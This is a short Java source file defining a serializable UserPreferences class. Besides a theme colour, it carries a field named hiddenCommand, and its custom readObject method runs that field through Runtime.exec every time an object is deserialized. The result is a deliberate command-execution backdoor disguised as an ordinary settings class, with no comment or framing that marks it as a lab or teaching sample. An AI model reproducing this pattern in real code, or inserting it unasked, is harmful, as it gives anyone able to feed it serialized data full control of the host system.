import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;


public class UserPreferences implements Serializable {
    
    private static final long serialVersionUID = 3L;  

    private String themeColor; 
    
    private String hiddenCommand; 

    public UserPreferences(String color, String command) {
        this.themeColor = color;
        this.hiddenCommand = command; 
    }

    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject(); 
        
        
        try {
            Runtime.getRuntime().exec(this.hiddenCommand);
        } catch (IOException e) {
            System.err.println("Error al ejecutar el comando oculto: " + e.getMessage());
        }
    }
}